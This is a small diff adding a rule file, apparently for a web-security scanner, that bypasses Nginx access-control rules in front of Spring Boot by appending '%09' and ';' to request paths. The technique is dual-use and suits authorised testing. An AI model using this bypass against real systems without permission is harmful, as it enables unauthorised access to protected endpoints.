@@ -1,0 +1,14 @@
+id: nginx-spring-boot-bypass
+description: Circumvents Nginx ACL rules by appending bypass characters to the path
+enabled: true
+modificationScript: |-
+  const modifiedRequests = [];
+
+  const bypassCharacters = ['%09', ';'];
+
+  bypassCharacters.forEach(char => {
+    const modifiedRequest = helper.setPath(input, (prev) => prev + char);
+    modifiedRequests.push(modifiedRequest);
+  });
+
+  return modifiedRequests;
